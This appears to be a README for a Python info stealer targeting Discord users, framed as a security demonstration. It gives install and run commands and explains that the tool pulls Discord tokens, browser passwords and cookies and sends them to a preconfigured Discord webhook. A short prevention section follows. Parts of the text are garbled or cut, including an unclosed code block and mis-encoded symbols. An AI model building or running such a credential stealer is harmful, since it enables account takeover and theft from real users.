## üìå About
This is an **info stealer** written in Python designed to demonstrate security vulnerabilities in Discord clients. It showcases how attackers extract sensitive data, such as:
- Browser cookies and saved passwords

cd infostealer

# Install dependencies
pip install -r requirements.txt

# Run the script
python pyinstallertoexe.py
```

## üîç How It Works
1. Locates and extracts Discord tokens from local storage.
2. Searches for stored browser credentials and cookies.
3. Sends the collected data to a pre-configured Discord webhook.

## üõ°Ô∏è Prevention & Security Measures
To protect yourself from similar threats:
- **Do not download untrusted files or scripts**
- Enable **two-factor authentication (2FA)** on Discord
- Use a **password manager** instead of saving passwords in browsers
